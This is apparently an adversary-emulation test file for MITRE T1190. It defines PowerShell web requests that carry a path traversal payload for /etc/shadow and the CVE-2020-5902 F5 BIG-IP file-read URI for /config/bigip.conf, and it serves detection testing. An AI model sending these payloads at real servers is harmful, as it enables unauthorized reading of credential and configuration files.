attack_technique: T1190
display_name: Exploit Public-Facing Application
atomic_tests:
-   name: Generic Web Directory Traversal Attempt
    description: |
        Uses PowerShell to initiate a Directory Traversal (Path Traversal) attempt against a vulnerable server.
        Upon successful exploitation, the server's /etc/shadow file should be returned. To be successful, this attack must be performed against a vulnerable server (one using improper URI validation or sanitization), otherwise it will fail.
    supported_platforms:
    -   windows
    -   linux
    input_arguments:
        target_server:
            default: 127.0.0.1
            description: Target server hostname or IP
            type: string
        target_server_port:
            default: 443
            description: Target server port
            type: integer
        user_agent:
            default: (Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
                Gecko) Chrome/44.0.2403.157 Safari/537.36)
            description: User Agent to be used
            type: string
        vulnerable_uri:
            default: ../../../../etc/shadow
            description: Common URI structure associated with /etc/shadow directory
                traversal attempts.
            type: string
    executor:
        command: |
            Write-Host "Configured to connect to target server: #{target_server}:#{target_server_port}"
            Invoke-WebRequest -Uri 'https://#{target_server}:#{target_server_port}/#{vulnerable_uri}' -UserAgent '#{user_agent}'
        elevation_required: false
        name: powershell
-   name: F5 BIG-IP TMUI LFI and RCE Vulnerability - CVE-2020-5902
    description: |
        Attempts to check for CVE-2020-5902, a vulnerability in F5 BigIP devices allowing Local File Inclusion and Remove Code Execution conditions. Executes Powershell.exe with instructions to perform a Local File Inclusion (LFI) attack against a vulnerable Big-IP server to read the servers configuration file. 

        Upon successful exploitation, the servers configuration file should be returned. Endpoint must be available on port 443.
    supported_platforms:
    -   windows
    -   linux
    input_arguments:
        target_server:
            default: 127.0.0.1
            description: BIG-IP server hostname or IP
            type: string
        target_server_port:
            default: 443
            description: BIG-IP server port
            type: integer
        user_agent:
            default: (Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
                Gecko) Chrome/44.0.2403.157 Safari/537.36)
            description: User Agent to be used
            type: string
        vulnerable_uri:
            default: tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
            description: BIG-IP server configuration file location, which is vulnerable
                to Local File Inclusion.
            type: string
    executor:
        command: |
            Write-Host "Configured to connect to BIG-IP server: #{target_server}:#{target_server_port}"
            Invoke-WebRequest -Uri 'https://#{target_server}:#{target_server_port}/#{vulnerable_uri}' -UserAgent '#{user_agent}'
        elevation_required: false
        name: powershell
